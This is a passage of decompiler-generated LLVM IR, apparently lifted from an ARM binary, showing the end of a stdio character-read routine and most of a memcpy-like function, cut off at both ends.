  %v3_14b04 = load i8, i8* %v2_14b04, align 1
  %v4_14b04 = zext i8 %v3_14b04 to i32
  store i32 %v4_14b04, i32* %r0.global-to-local, align 4
  %v6_14b04 = add i32 %v2_14afc, 1
  store i32 %v6_14b04, i32* %r1.global-to-local, align 4
  store i32 %v6_14b04, i32* %v1_14afc, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14af8
  %v1_14b10 = add i32 %v2_14b08, 4
  %v2_14b10 = inttoptr i32 %v1_14b10 to i32*
  %v3_14b10 = load i32, i32* %v2_14b10, align 4
  %v4_14b18 = icmp eq i32 %v3_14b10, -2
  br i1 %v4_14b18, label %dec_label_pc_14b1c, label %dec_label_pc_14b34

dec_label_pc_14b1c:                               ; preds = %dec_label_pc_14b10
  %v1_14b1c = or i32 %v5_14ac4, 4
  store i32 %v1_14b1c, i32* %r2.global-to-local, align 4
  store i8 %v3_14ac0, i8* %v2_14ac0, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b2c

dec_label_pc_14b2c:                               ; preds = %dec_label_pc_14ad0, %dec_label_pc_14b1c
  %v0_14b2c = load i32, i32* %r2.global-to-local, align 4
  %v1_14b2c = trunc i32 %v0_14b2c to i8
  %v2_14b2c = load i32, i32* @r4, align 4
  %v3_14b2c = inttoptr i32 %v2_14b2c to i8*
  store i8 %v1_14b2c, i8* %v3_14b2c, align 1
  br label %dec_label_pc_14b9c

dec_label_pc_14b34:                               ; preds = %dec_label_pc_14b10
  %v1_14b34 = and i32 %v4_14ac4, 768
  %v2_14b34 = icmp eq i32 %v1_14b34, 0
  br i1 %v2_14b34, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_14b34
  store i32 ptrtoint (i32** @global_var_231d0.331 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14b34, %bb19
  store i32 84800, i32* @lr, align 4
  %v1_14b3c = xor i1 %v2_14b34, true
  call void @__pseudo_cond_branch(i1 %v1_14b3c, i32 ptrtoint (i32* @global_var_112d8.578 to i32))
  %v0_14b40 = load i32, i32* @r4, align 4
  %v1_14b40 = add i32 %v0_14b40, 8
  store i32 %v1_14b40, i32* %r2.global-to-local, align 4
  %v1_14b44 = inttoptr i32 %v1_14b40 to i32*
  %v2_14b44 = load i32, i32* %v1_14b44, align 4
  store i32 %v2_14b44, i32* %r2.global-to-local, align 4
  %v3_14b44 = add i32 %v0_14b40, 12
  %v4_14b44 = inttoptr i32 %v3_14b44 to i32*
  %v5_14b44 = load i32, i32* %v4_14b44, align 4
  %v9_14b48 = icmp eq i32 %v5_14b44, %v2_14b44
  br i1 %v9_14b48, label %dec_label_pc_14b7c, label %dec_label_pc_14b50

dec_label_pc_14b50:                               ; preds = %bb20
  %v2_14b50 = add i32 %v0_14b40, 24
  %v3_14b50 = inttoptr i32 %v2_14b50 to i32*
  store i32 %v2_14b44, i32* %v3_14b50, align 4
  %v0_14b54 = load i32, i32* @r4, align 4
  store i32 %v0_14b54, i32* %r0.global-to-local, align 4
  %v2_14b58 = call i32 @__stdio_rfill(i32 %v0_14b54)
  store i32 %v2_14b58, i32* %r0.global-to-local, align 4
  %v2_14b5c = icmp eq i32 %v2_14b58, 0
  br i1 %v2_14b5c, label %dec_label_pc_14b98, label %dec_label_pc_14b64

dec_label_pc_14b64:                               ; preds = %dec_label_pc_14b50
  %v0_14b64 = load i32, i32* @r4, align 4
  %v1_14b64 = add i32 %v0_14b64, 20
  %v2_14b64 = inttoptr i32 %v1_14b64 to i32*
  %v3_14b64 = load i32, i32* %v2_14b64, align 4
  %v2_14b68 = add i32 %v0_14b64, 24
  %v3_14b68 = inttoptr i32 %v2_14b68 to i32*
  store i32 %v3_14b64, i32* %v3_14b68, align 4
  %v0_14b6c = load i32, i32* @r4, align 4
  %v1_14b6c = add i32 %v0_14b6c, 16
  %v2_14b6c = inttoptr i32 %v1_14b6c to i32*
  %v3_14b6c = load i32, i32* %v2_14b6c, align 4
  %v1_14b70 = inttoptr i32 %v3_14b6c to i8*
  %v2_14b70 = load i8, i8* %v1_14b70, align 1
  %v3_14b70 = zext i8 %v2_14b70 to i32
  store i32 %v3_14b70, i32* %r0.global-to-local, align 4
  %v5_14b70 = add i32 %v3_14b6c, 1
  store i32 %v5_14b70, i32* %v2_14b6c, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14b7c:                               ; preds = %bb20
  %v1_14b7c = inttoptr i32 %v0_14b40 to i8*
  store i32 %v0_14b40, i32* %r0.global-to-local, align 4
  %v2_14b80 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_14b80, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_14b88 = call i32 @__stdio_READ(i8* %v1_14b7c, i32 %v2_14b80, i32 1)
  store i32 %v5_14b88, i32* %r0.global-to-local, align 4
  %v2_14b8c = icmp eq i32 %v5_14b88, 0
  br i1 %v2_14b8c, label %dec_label_pc_14b98, label %bb21

bb21:                                             ; preds = %dec_label_pc_14b7c
  %v4_14b90 = load i8, i8* %stack_var_-9, align 1
  %v5_14b90 = sext i8 %v4_14b90 to i32
  store i32 %v5_14b90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b7c, %dec_label_pc_14aac, %dec_label_pc_14b50
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14b9c:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_14b64, %dec_label_pc_14b2c, %dec_label_pc_14b98
  %v2_14ba0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ba0, i32* @r4, align 4
  %v8_14ba0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_14ba0

; uselistorder directives
  uselistorder i32 %v2_14afc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_14abc, { 1, 0, 2 }
  uselistorder i32 %v2_14b08, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_14a7c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_23208.298, { 2, 1, 0 }
  uselistorder i32** @global_var_231d0.331, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14b9c, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_14b98, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14b2c, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_14bb0 = load i32, i32* @r1, align 4
  %v1_14bb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_14bb0 = sub i32 %v0_14bb0, %v1_14bb0
  %v3_14bb0 = icmp ult i32 %v0_14bb0, %v1_14bb0
  %v4_14bb0 = xor i32 %v1_14bb0, %v0_14bb0
  %v5_14bb0 = xor i32 %v2_14bb0, %v0_14bb0
  %v6_14bb0 = and i32 %v5_14bb0, %v4_14bb0
  %v7_14bb0 = icmp slt i32 %v6_14bb0, 0
  store i1 %v7_14bb0, i1* %cpsr_v.global-to-local, align 1
  %v8_14bb0 = icmp slt i32 %v2_14bb0, 0
  store i1 %v8_14bb0, i1* %cpsr_n.global-to-local, align 1
  %v9_14bb0 = icmp eq i32 %v0_14bb0, %v1_14bb0
  store i1 %v9_14bb0, i1* @cpsr_z, align 1
  br i1 %v3_14bb0, label %dec_label_pc_14dfc, label %dec_label_pc_14bb8

dec_label_pc_14bb8:                               ; preds = %entry
  br i1 %v9_14bb0, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_14bb8
  %merge = phi i32 [ %v0_14bb0, %dec_label_pc_14bb8 ], [ %v2_14e90, %bb143 ], [ %v11_14eac, %bb146 ], [ %v7_14eac, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_14bb8
  %v5_14bbc = inttoptr i32 %v1_14bb0 to i8*
  store i8* %v5_14bbc, i8** %stack_var_-8, align 4
  %v0_14bc0 = load i32, i32* @r2, align 4
  %v2_14bc0 = add i32 %v0_14bc0, -4
  store i32 %v2_14bc0, i32* %r2.global-to-local, align 4
  %v4_14bc0 = sub i32 3, %v0_14bc0
  %v5_14bc0 = and i32 %v4_14bc0, %v0_14bc0
  %v6_14bc0 = icmp slt i32 %v5_14bc0, 0
  store i1 %v6_14bc0, i1* %cpsr_v.global-to-local, align 1
  %v7_14bc0 = icmp slt i32 %v2_14bc0, 0
  store i1 %v7_14bc0, i1* %cpsr_n.global-to-local, align 1
  %v5_14bc4 = icmp slt i32 %v0_14bc0, 4
  br i1 %v5_14bc4, label %bb133, label %dec_label_pc_14bc8

dec_label_pc_14bc8:                               ; preds = %bb
  %v1_14bc8 = urem i32 %v1_14bb0, 4
  store i32 %v1_14bc8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14bc8 = icmp eq i32 %v1_14bc8, 0
  br i1 %v2_14bc8, label %dec_label_pc_14bd0, label %dec_label_pc_14c74

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bc8
  %v1_14bd0 = urem i32 %v0_14bb0, 4
  store i32 %v1_14bd0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14bd0 = icmp eq i32 %v1_14bd0, 0
  %extract.t = trunc i32 %v0_14bb0 to i2
  br i1 %v2_14bd0, label %dec_label_pc_14bd8, label %dec_label_pc_14ca4

dec_label_pc_14bd8:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14c9c
  %v0_14bf093 = phi i32 [ %v1_14bb0, %dec_label_pc_14bd0 ], [ %v0_14cec76, %dec_label_pc_14c9c ]
  %v0_14bec92 = phi i32 [ %v0_14bb0, %dec_label_pc_14bd0 ], [ %v0_14c9c, %dec_label_pc_14c9c ]
  %v0_14bd8 = phi i32 [ %v2_14bc0, %dec_label_pc_14bd0 ], [ %v2_14c94, %dec_label_pc_14c9c ]
  %v2_14bd8 = add i32 %v0_14bd8, -8
  store i32 %v2_14bd8, i32* %r2.global-to-local, align 4
  %v4_14bd8 = sub i32 7, %v0_14bd8
  %v5_14bd8 = and i32 %v4_14bd8, %v0_14bd8
  %v6_14bd8 = icmp slt i32 %v5_14bd8, 0
  store i1 %v6_14bd8, i1* %cpsr_v.global-to-local, align 1
  %v7_14bd8 = icmp slt i32 %v2_14bd8, 0
  store i1 %v7_14bd8, i1* %cpsr_n.global-to-local, align 1
  %v5_14bdc = icmp slt i32 %v0_14bd8, 8
  br i1 %v5_14bdc, label %dec_label_pc_14c2c, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bd8
  %v2_14be0 = add i32 %v0_14bd8, -28
  store i32 %v2_14be0, i32* %r2.global-to-local, align 4
  %v4_14be0 = sub i32 27, %v0_14bd8
  %v5_14be0 = and i32 %v4_14be0, %v2_14bd8
  %v6_14be0 = icmp slt i32 %v5_14be0, 0
  store i1 %v6_14be0, i1* %cpsr_v.global-to-local, align 1
  %v7_14be0 = icmp slt i32 %v2_14be0, 0
  store i1 %v7_14be0, i1* %cpsr_n.global-to-local, align 1
  %v5_14be4 = icmp slt i32 %v2_14bd8, 20
  br i1 %v5_14be4, label %dec_label_pc_14c18, label %dec_label_pc_14be8

dec_label_pc_14be8:                               ; preds = %dec_label_pc_14be0
  %v0_14be8 = load i32, i32* @r4, align 4
  store i32 %v0_14be8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14bec

dec_label_pc_14bec:                               ; preds = %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge, %dec_label_pc_14be8
  %v0_14bf0 = phi i32 [ %v12_14bf8, %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge ], [ %v0_14bf093, %dec_label_pc_14be8 ]
  %v0_14bec = phi i32 [ %v0_14bec.pre, %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge ], [ %v0_14bec92, %dec_label_pc_14be8 ]
  %v1_14bec = inttoptr i32 %v0_14bec to i32*
  %v2_14bec = load i32, i32* %v1_14bec, align 4
  store i32 %v2_14bec, i32* %r3.global-to-local, align 4
  %v3_14bec = add i32 %v0_14bec, 4
  %v4_14bec = inttoptr i32 %v3_14bec to i32*
  %v5_14bec = load i32, i32* %v4_14bec, align 4
  store i32 %v5_14bec, i32* %r4.global-to-local, align 4
  %v6_14bec = add i32 %v0_14bec, 8
  %v7_14bec = inttoptr i32 %v6_14bec to i32*
  %v8_14bec = load i32, i32* %v7_14bec, align 4
  store i32 %v8_14bec, i32* %ip.global-to-local, align 4
  %v9_14bec = add i32 %v0_14bec, 12
  %v10_14bec = inttoptr i32 %v9_14bec to i32*
  %v11_14bec = load i32, i32* %v10_14bec, align 4
  store i32 %v11_14bec, i32* %lr.global-to-local, align 4
  %v12_14bec = add i32 %v0_14bec, 16
  store i32 %v12_14bec, i32* %r1.global-to-local, align 4
  %v1_14bf0 = inttoptr i32 %v0_14bf0 to i32*
  store i32 %v2_14bec, i32* %v1_14bf0, align 4
  %v3_14bf0 = add i32 %v0_14bf0, 4
  %v4_14bf0 = inttoptr i32 %v3_14bf0 to i32*
  %v5_14bf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14bf0, i32* %v4_14bf0, align 4
  %v6_14bf0 = add i32 %v0_14bf0, 8
  %v7_14bf0 = inttoptr i32 %v6_14bf0 to i32*
  %v8_14bf0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_14bf0, i32* %v7_14bf0, align 4
  %v9_14bf0 = add i32 %v0_14bf0, 12
  %v10_14bf0 = inttoptr i32 %v9_14bf0 to i32*
  %v11_14bf0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14bf0, i32* %v10_14bf0, align 4
  %v12_14bf0 = add i32 %v0_14bf0, 16
  store i32 %v12_14bf0, i32* %r0.global-to-local, align 4
  %v0_14bf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14bf4 = inttoptr i32 %v0_14bf4 to i32*
  %v2_14bf4 = load i32, i32* %v1_14bf4, align 4
  store i32 %v2_14bf4, i32* %r3.global-to-local, align 4
  %v3_14bf4 = add i32 %v0_14bf4, 4
  %v4_14bf4 = inttoptr i32 %v3_14bf4 to i32*
  %v5_14bf4 = load i32, i32* %v4_14bf4, align 4
  store i32 %v5_14bf4, i32* %r4.global-to-local, align 4
  %v6_14bf4 = add i32 %v0_14bf4, 8
  %v7_14bf4 = inttoptr i32 %v6_14bf4 to i32*
  %v8_14bf4 = load i32, i32* %v7_14bf4, align 4
  store i32 %v8_14bf4, i32* @ip, align 4
  %v9_14bf4 = add i32 %v0_14bf4, 12
  %v10_14bf4 = inttoptr i32 %v9_14bf4 to i32*
  %v11_14bf4 = load i32, i32* %v10_14bf4, align 4
  store i32 %v11_14bf4, i32* @lr, align 4
  %v12_14bf4 = add i32 %v0_14bf4, 16
  store i32 %v12_14bf4, i32* @r1, align 4
  %v1_14bf8 = inttoptr i32 %v12_14bf0 to i32*
  store i32 %v2_14bf4, i32* %v1_14bf8, align 4
  %v3_14bf8 = add i32 %v0_14bf0, 20
  %v4_14bf8 = inttoptr i32 %v3_14bf8 to i32*
  %v5_14bf8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14bf8, i32* %v4_14bf8, align 4
  %v6_14bf8 = add i32 %v0_14bf0, 24
  %v7_14bf8 = inttoptr i32 %v6_14bf8 to i32*
  %v8_14bf8 = load i32, i32* @ip, align 4
  store i32 %v8_14bf8, i32* %v7_14bf8, align 4
  %v9_14bf8 = add i32 %v0_14bf0, 28
  %v10_14bf8 = inttoptr i32 %v9_14bf8 to i32*
  %v11_14bf8 = load i32, i32* @lr, align 4
  store i32 %v11_14bf8, i32* %v10_14bf8, align 4
  %v12_14bf8 = add i32 %v0_14bf0, 32
  store i32 %v12_14bf8, i32* %r0.global-to-local, align 4
  %v0_14bfc = load i32, i32* %r2.global-to-local, align 4
  %v2_14bfc = add i32 %v0_14bfc, -32
  store i32 %v2_14bfc, i32* %r2.global-to-local, align 4
  %v6_14c00 = icmp slt i32 %v0_14bfc, 32
  br i1 %v6_14c00, label %dec_label_pc_14c04, label %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge

dec_label_pc_14bec.dec_label_pc_14bec_crit_edge:  ; preds = %dec_label_pc_14bec
  %v0_14bec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14bec

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14bec
  %v4_14c04 = add i32 %v0_14bfc, -16
  %v6_14c04 = add i32 %v0_14bfc, 2147483616
  %v7_14c04 = and i32 %v4_14c04, %v6_14c04
  %v8_14c04 = icmp slt i32 %v7_14c04, 0
  store i1 %v8_14c04, i1* %cpsr_v.global-to-local, align 1
  %v9_14c04 = icmp slt i32 %v4_14c04, 0
  store i1 %v9_14c04, i1* %cpsr_n.global-to-local, align 1
  %v5_14c08 = icmp slt i32 %v2_14bfc, -16
  br i1 %v5_14c08, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_14c04
  %v6_14c08 = load i32, i32* @r1, align 4
  %v7_14c08 = inttoptr i32 %v6_14c08 to i32*
  %v8_14c08 = load i32, i32* %v7_14c08, align 4
  store i32 %v8_14c08, i32* %r3.global-to-local, align 4
  %v9_14c08 = add i32 %v6_14c08, 4
  %v10_14c08 = inttoptr i32 %v9_14c08 to i32*
  %v11_14c08 = load i32, i32* %v10_14c08, align 4
  store i32 %v11_14c08, i32* %r4.global-to-local, align 4
  %v12_14c08 = add i32 %v6_14c08, 8
  %v13_14c08 = inttoptr i32 %v12_14c08 to i32*
  %v14_14c08 = load i32, i32* %v13_14c08, align 4
  store i32 %v14_14c08, i32* @ip, align 4
  %v15_14c08 = add i32 %v6_14c08, 12
  %v16_14c08 = inttoptr i32 %v15_14c08 to i32*
  %v17_14c08 = load i32, i32* %v16_14c08, align 4
  store i32 %v17_14c08, i32* @lr, align 4
  %v18_14c08 = add i32 %v6_14c08, 16
  store i32 %v18_14c08, i32* @r1, align 4
  %v7_14c0c = inttoptr i32 %v12_14bf8 to i32*
  store i32 %v8_14c08, i32* %v7_14c0c, align 4
  %v9_14c0c = add i32 %v0_14bf0, 36
  %v10_14c0c = inttoptr i32 %v9_14c0c to i32*
  %v11_14c0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_14c0c, i32* %v10_14c0c, align 4
  %v12_14c0c = add i32 %v0_14bf0, 40
  %v13_14c0c = inttoptr i32 %v12_14c0c to i32*
  %v14_14c0c = load i32, i32* @ip, align 4
  store i32 %v14_14c0c, i32* %v13_14c0c, align 4
  %v15_14c0c = add i32 %v0_14bf0, 44
  %v16_14c0c = inttoptr i32 %v15_14c0c to i32*
  %v17_14c0c = load i32, i32* @lr, align 4
  store i32 %v17_14c0c, i32* %v16_14c0c, align 4
  %v18_14c0c = add i32 %v0_14bf0, 48
  store i32 %v18_14c0c, i32* %r0.global-to-local, align 4
  %v6_14c10 = load i32, i32* %r2.global-to-local, align 4
  %v7_14c10 = add i32 %v6_14c10, -16
  store i32 %v7_14c10, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14c04, %bb130
  %v3_14c20102 = phi i32 [ %v12_14bf8, %dec_label_pc_14c04 ], [ %v18_14c0c, %bb130 ]
  %v0_14c1896 = phi i32 [ %v2_14bfc, %dec_label_pc_14c04 ], [ %v7_14c10, %bb130 ]
  %v2_14c14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14c14, i32* @r4, align 4
  br label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %dec_label_pc_14be0, %.thread2
  %v3_14c20101 = phi i32 [ %v0_14bf093, %dec_label_pc_14be0 ], [ %v3_14c20102, %.thread2 ]
  %v0_14c18 = phi i32 [ %v2_14be0, %dec_label_pc_14be0 ], [ %v0_14c1896, %.thread2 ]
  %v1_14c18 = add i32 %v0_14c18, 20
  store i32 %v1_14c18, i32* %r2.global-to-local, align 4
  %v3_14c18 = sub i32 0, %v0_14c18
  %v4_14c18 = and i32 %v1_14c18, %v3_14c18
  %v5_14c18 = icmp slt i32 %v4_14c18, 0
  store i1 %v5_14c18, i1* %cpsr_v.global-to-local, align 1
  %v6_14c18 = icmp slt i32 %v1_14c18, 0
  store i1 %v6_14c18, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %.thread118, %dec_label_pc_14c18
  %v0_14c2c.pre149 = phi i32 [ %v0_14c2c.pre, %.thread118 ], [ %v1_14c18, %dec_label_pc_14c18 ]
  %v3_14c20 = phi i32 [ %v3_14c2099119, %.thread118 ], [ %v3_14c20101, %dec_label_pc_14c18 ]
  %v1_14c24 = phi i1 [ %v1_14c28, %.thread118 ], [ %v5_14c18, %dec_label_pc_14c18 ]
  %v0_14c24 = phi i1 [ %v0_14c28, %.thread118 ], [ %v6_14c18, %dec_label_pc_14c18 ]
  %v2_14c1c = xor i1 %v1_14c24, %v0_14c24
  br i1 %v2_14c1c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_14c1c
  %v3_14c1c = load i32, i32* @r1, align 4
  %v4_14c1c = inttoptr i32 %v3_14c1c to i32*
  %v5_14c1c = load i32, i32* %v4_14c1c, align 4
  store i32 %v5_14c1c, i32* %r3.global-to-local, align 4
  %v6_14c1c = add i32 %v3_14c1c, 4
  %v7_14c1c = inttoptr i32 %v6_14c1c to i32*
  %v8_14c1c = load i32, i32* %v7_14c1c, align 4
  store i32 %v8_14c1c, i32* @ip, align 4
  %v9_14c1c = add i32 %v3_14c1c, 8
  %v10_14c1c = inttoptr i32 %v9_14c1c to i32*
  %v11_14c1c = load i32, i32* %v10_14c1c, align 4
  store i32 %v11_14c1c, i32* @lr, align 4
  %v12_14c1c = add i32 %v3_14c1c, 12
  store i32 %v12_14c1c, i32* @r1, align 4
  %v4_14c20 = inttoptr i32 %v3_14c20 to i32*
  store i32 %v5_14c1c, i32* %v4_14c20, align 4
  %v6_14c20 = add i32 %v3_14c20, 4
  %v7_14c20 = inttoptr i32 %v6_14c20 to i32*
  %v8_14c20 = load i32, i32* @ip, align 4
  store i32 %v8_14c20, i32* %v7_14c20, align 4
  %v9_14c20 = add i32 %v3_14c20, 8
  %v10_14c20 = inttoptr i32 %v9_14c20 to i32*
  %v11_14c20 = load i32, i32* @lr, align 4
  store i32 %v11_14c20, i32* %v10_14c20, align 4
  %v12_14c20 = add i32 %v3_14c20, 12
  store i32 %v12_14c20, i32* %r0.global-to-local, align 4
  %v3_14c24 = load i32, i32* %r2.global-to-local, align 4
  %v4_14c24 = add i32 %v3_14c24, -12
  store i32 %v4_14c24, i32* %r2.global-to-local, align 4
  %v6_14c24 = sub i32 11, %v3_14c24
  %v7_14c24 = and i32 %v6_14c24, %v3_14c24
  %v8_14c24 = icmp slt i32 %v7_14c24, 0
  store i1 %v8_14c24, i1* %cpsr_v.global-to-local, align 1
  %v9_14c24 = icmp slt i32 %v4_14c24, 0
  store i1 %v9_14c24, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_14c1c, %bb131
  %v0_14c2c.pre = phi i32 [ %v4_14c24, %bb131 ], [ %v0_14c2c.pre149, %dec_label_pc_14c1c ]
  %v3_14c2099119 = phi i32 [ %v12_14c20, %bb131 ], [ %v3_14c20, %dec_label_pc_14c1c ]
  %v1_14c28 = phi i1 [ %v8_14c24, %bb131 ], [ %v1_14c24, %dec_label_pc_14c1c ]
  %v0_14c28 = phi i1 [ %v9_14c24, %bb131 ], [ %v0_14c24, %dec_label_pc_14c1c ]
  %v2_14c28 = xor i1 %v1_14c28, %v0_14c28
  br i1 %v2_14c28, label %dec_label_pc_14c2c, label %dec_label_pc_14c1c

dec_label_pc_14c2c:                               ; preds = %.thread118, %dec_label_pc_14bd8
  %v7_14c3c = phi i32 [ %v0_14bf093, %dec_label_pc_14bd8 ], [ %v3_14c2099119, %.thread118 ]
  %v0_14c2c = phi i32 [ %v2_14bd8, %dec_label_pc_14bd8 ], [ %v0_14c2c.pre, %.thread118 ]
  %v2_14c2c = add i32 %v0_14c2c, 8
  store i32 %v2_14c2c, i32* %r2.global-to-local, align 4
  %v4_14c2c = sub i32 0, %v0_14c2c
  %v5_14c2c = and i32 %v2_14c2c, %v4_14c2c
  %v6_14c2c = icmp slt i32 %v5_14c2c, 0
  store i1 %v6_14c2c, i1* %cpsr_v.global-to-local, align 1
  %v7_14c2c = icmp slt i32 %v2_14c2c, 0
  store i1 %v7_14c2c, i1* %cpsr_n.global-to-local, align 1
  %v5_14c30 = icmp slt i32 %v0_14c2c, -8
  br i1 %v5_14c30, label %bb133, label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14c2c
  %v6_14c34 = add i32 %v0_14c2c, 4
  store i32 %v6_14c34, i32* %r2.global-to-local, align 4
  %v8_14c34 = sub i32 -5, %v0_14c2c
  %v9_14c34 = and i32 %v8_14c34, %v2_14c2c
  %v10_14c34 = icmp slt i32 %v9_14c34, 0
  store i1 %v10_14c34, i1* %cpsr_v.global-to-local, align 1
  %v11_14c34 = icmp slt i32 %v6_14c34, 0
  store i1 %v11_14c34, i1* %cpsr_n.global-to-local, align 1
  %v5_14c38 = icmp slt i32 %v2_14c2c, 4
  %v6_14c38 = load i32, i32* @r1, align 4
  %v7_14c38 = inttoptr i32 %v6_14c38 to i32*
  %v8_14c38 = load i32, i32* %v7_14c38, align 4
  store i32 %v8_14c38, i32* %r3.global-to-local, align 4
  %v10_14c38 = add i32 %v6_14c38, 4
  br i1 %v5_14c38, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_14c34
  store i32 %v10_14c38, i32* @r1, align 4
  %v8_14c3c = inttoptr i32 %v7_14c3c to i32*
  store i32 %v8_14c38, i32* %v8_14c3c, align 4
  %v9_14c3c = load i32, i32* %r0.global-to-local, align 4
  %v10_14c3c = add i32 %v9_14c3c, 4
  store i32 %v10_14c3c, i32* %r0.global-to-local, align 4
  %v0_14c4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_14c34
  %v10_14c40 = inttoptr i32 %v10_14c38 to i32*
  %v11_14c40 = load i32, i32* %v10_14c40, align 4
  store i32 %v11_14c40, i32* @ip, align 4
  %v12_14c40 = add i32 %v6_14c38, 8
  store i32 %v12_14c40, i32* @r1, align 4
  %v7_14c44 = inttoptr i32 %v7_14c3c to i32*
  store i32 %v8_14c38, i32* %v7_14c44, align 4
  %v9_14c44 = add i32 %v7_14c3c, 4
  %v10_14c44 = inttoptr i32 %v9_14c44 to i32*
  %v11_14c44 = load i32, i32* @ip, align 4
  store i32 %v11_14c44, i32* %v10_14c44, align 4
  %v12_14c44 = add i32 %v7_14c3c, 8
  store i32 %v12_14c44, i32* %r0.global-to-local, align 4
  %v6_14c48 = load i32, i32* %r2.global-to-local, align 4
  %v7_14c48 = add i32 %v6_14c48, -4
  store i32 %v7_14c48, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_14c2c, %bb, %dec_label_pc_14df4, %dec_label_pc_14d1c, %dec_label_pc_14d88, %bb132
  %v2_14c5c = phi i32 [ %v10_14c3c, %.thread6 ], [ %v0_14cec76, %.thread12 ], [ %v7_14c3c, %dec_label_pc_14c2c ], [ %v1_14bb0, %bb ], [ %v2_14c5c114, %dec_label_pc_14df4 ], [ %v2_14c5c113, %dec_label_pc_14d1c ], [ %v2_14c5c112, %dec_label_pc_14d88 ], [ %v12_14c44, %bb132 ]
  %v0_14c4c = phi i32 [ %v0_14c4c.pre, %.thread6 ], [ %v2_14c94, %.thread12 ], [ %v2_14c2c, %dec_label_pc_14c2c ], [ %v2_14bc0, %bb ], [ %v0_14c4c110, %dec_label_pc_14df4 ], [ %v0_14c4c109, %dec_label_pc_14d1c ], [ %v0_14c4c108, %dec_label_pc_14d88 ], [ %v7_14c48, %bb132 ]
  %v1_14c4c = add i32 %v0_14c4c, 4
  store i32 %v1_14c4c, i32* @r2, align 4
  %v3_14c4c = sub i32 0, %v0_14c4c
  %v4_14c4c = and i32 %v1_14c4c, %v3_14c4c
  %v5_14c4c = icmp slt i32 %v4_14c4c, 0
  store i1 %v5_14c4c, i1* %cpsr_v.global-to-local, align 1
  %v6_14c4c = icmp slt i32 %v1_14c4c, 0
  store i1 %v6_14c4c, i1* %cpsr_n.global-to-local, align 1
  %v7_14c4c = icmp eq i32 %v1_14c4c, 0
